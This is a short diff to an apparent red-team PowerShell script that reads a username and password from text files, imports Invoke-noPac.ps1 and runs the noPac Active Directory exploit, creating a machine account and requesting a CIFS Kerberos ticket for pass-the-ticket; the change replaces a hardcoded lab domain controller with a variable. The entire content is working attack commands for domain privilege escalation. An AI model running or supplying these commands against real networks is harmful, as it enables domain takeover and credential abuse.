@@ -11,4 +11,4 @@ $username = Get-Content .\username.txt -First 1
 $password = Get-Content .\password.txt -First 1
 $domain = (gwmi win32_computersystem).Domain
 import-module .\Invoke-noPac.ps1
-Invoke-noPac "-domain $domain -user $username -pass $password /enctype rc4 /dc DC2.redteam.lab /mAccount newmachine /mPassword Password123 /service cifs /ptt"
+Invoke-noPac "-domain $domain -user $username -pass $password /enctype rc4 /dc $DC.$domain /mAccount newmachine /mPassword Password123 /service cifs /ptt"
